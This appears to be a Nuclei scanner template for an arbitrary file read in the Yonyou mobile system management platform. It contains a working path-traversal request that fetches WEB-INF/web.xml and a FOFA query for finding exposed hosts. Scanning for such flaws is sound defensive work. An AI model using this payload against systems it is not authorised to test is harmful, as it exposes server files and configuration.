id: yonyou-mobile-getFileLocal-fileread
info:
  name: 用友移动系统管理平台 getFileLocal - fileread
  author: leadlife
  severity: high
  description: todo
  reference: 
    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86-getFileLocal-%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96
  metadata:
    verified: false
    fofa-query: app="用友-移动系统管理"
  tags: yonyou,mobile,fileread,oa

http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml"

    matchers:
      - type: dsl
        dsl:
          - status_code==200
          - contains(header,'attachment; filename')
          - contains_all(body, 'version=')
        condition: and